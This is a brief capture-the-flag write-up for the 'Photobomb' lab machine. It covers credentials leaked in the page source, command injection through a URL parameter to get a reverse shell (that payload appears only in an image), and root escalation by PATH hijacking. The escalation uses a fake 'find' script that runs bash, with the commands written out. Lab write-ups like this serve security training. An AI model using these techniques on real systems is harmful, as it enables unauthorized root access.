# Photobomb

After Nmap (22,80), edit the /etc/hosts file and inspect the web application.

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Inspecting the code of `photobomb.htb`, there is this line: `http://pH0t0:b0Mb!@photobomb.htb/printer`

It logs in automatically.

Inspect the POST with burp to download a PNG photo and find diferrent parameteres, so lets use an encoded URL with the parameter to obtain a reverse shell:

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Analyze the sudo permissions

`sudo -l`

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

We open the script and see that find is using the relative path, not the absolute. So lets crate a find command as bash and execute it as root

```bash
echo bash > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh # This add the pwd to the variable $PATH 
id

```

